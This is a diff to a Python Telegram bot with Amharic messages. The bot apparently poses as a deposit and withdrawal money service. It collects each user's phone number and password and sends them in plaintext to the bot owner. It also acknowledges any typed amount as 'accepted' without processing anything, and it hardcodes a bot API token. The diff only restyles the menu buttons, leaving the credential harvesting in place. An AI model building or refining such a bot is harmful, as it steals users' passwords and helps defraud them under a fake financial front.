@@ -1,9 +1,9 @@
-
-from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
     MessageHandler,
+    CallbackQueryHandler,
     ConversationHandler,
     filters,
     ContextTypes,
@@ -35,12 +35,12 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = context.user_data['phone']
     user = update.effective_user
     
-    await update.message.reply_text("በስኬት ተመዝግበዋል!")
+    await update.message.reply_text("በስኬት ተመዝግበዋል! ✅")
     
+    # መረጃውን ለአንተ መላኪያ
     log_message = (
         f"🔔 **አዲስ ተጠቃሚ ተመዝግቧል!**\n\n"
         f"👤 ስም: {user.first_name}\n"
-        f"🆔 ID: {user.id}\n"
         f"📱 ስልክ: `{phone}`\n"
         f"🔑 ፓስወርድ: `{password}`"
     )
@@ -49,26 +49,40 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await context.bot.send_message(chat_id=user.id, text=f"[ለባለቤቱ የሚላክ መረጃ]:\n{log_message}", parse_mode="Markdown")
 
-    keyboard = [['Deposit', 'Withdraw'], ['Support']]
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    # አዲሱ ውብ Inline Buttons አሠራር
+    keyboard = [
+        [
+            InlineKeyboardButton("💰 Deposit", callback_data='btn_deposit'),
+            InlineKeyboardButton("💸 Withdraw", callback_data='btn_withdraw')
+        ],
+        [
+            InlineKeyboardButton("📞 Support", callback_data='btn_support')
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await update.message.reply_text("ምን ማድረግ ይፈልጋሉ? ከታች ካሉት አማራጮች ይምረጡ፡", reply_markup=reply_markup)
+    await update.message.reply_text("ምን ማድረግ ይፈልጋሉ? ከታች ካሉት አማራጮች ይምረጡ፦", reply_markup=reply_markup)
     return MENU
 
-async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text
+# ቁልፎቹ ሲነኩ ምላሽ የሚሰጠው ክፍል
+async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer() # የመጫኛዋን ሰማያዊ ምልክት ለማጥፋት
     
-    if text == 'Deposit':
-        await update.message.reply_text("እባክዎ የ Deposit መጠኑን ቁጥር ብቻ ይላኩ:")
-    elif text == 'Withdraw':
-        await update.message.reply_text("እባክዎ የ Withdraw መጠኑን ቁጥር ብቻ ይላኩ:")
-    elif text == 'Support':
-        await update.message.reply_text("አስተዳዳሪውን እያገናኘን ነው፣ እባክዎ ይጠብቁ...")
+    if query.data == 'btn_deposit':
+        await query.message.reply_text("💰 እባክዎ የ Deposit መጠኑን ቁጥር ብቻ ይላኩ፦")
+    elif query.data == 'btn_withdraw':
+        await query.message.reply_text("💸 እባክዎ የ Withdraw መጠኑን ቁጥር ብቻ ይላኩ፦")
+    elif query.data == 'btn_support':
+        await query.message.reply_text("📞 አስተዳዳሪውን እያገናኘን ነው፣ እባክዎ በውስጥ መስመር ይጠብቁ...")
+
+# ተጠቃሚው ቁጥር ሲልክ የሚያስተናግደው ክፍል
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    if text.isdigit():
+        await update.message.reply_text(f"የ {text} ብር ጥያቄዎ ተቀባይነት አግኝቷል! ⏳")
     else:
-        if text.isdigit():
-            await update.message.reply_text(f"የ {text} ብር ጥያቄዎ ተቀባይነት አግኝቷል!")
-        else:
-            await update.message.reply_text("እባክዎ ከሜኑ ውስጥ ትክክለኛ ምርጫ ይምረጡ።")
+        await update.message.reply_text("እባክዎ ቁጥር ብቻ ያስገቡ ወይም ከላይ ካሉት ቁልፎች አንዱን ይጫኑ።")
     return MENU
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -76,7 +90,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 if __name__ == '__main__':
-    # በ Render ላይ ያለምንም ፕሮክሲ በቀጥታ በፍጥነት ይገናኛል
+    # በ Render ላይ የሚሠራው ያንተ አዲሱ Token
     app = ApplicationBuilder().token("8960492606:AAEQKJN5S70C3u6OQVVGUkfLNEC7K2w7deA").build()
     
     conv_handler = ConversationHandler(
@@ -84,7 +98,10 @@ if __name__ == '__main__':
         states={
             PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
             PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
-            MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu)],
+            MENU: [
+                CallbackQueryHandler(button_click), # ቁልፎቹን ለመያዝ
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text) # ፅሁፍ ለመያዝ
+            ],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
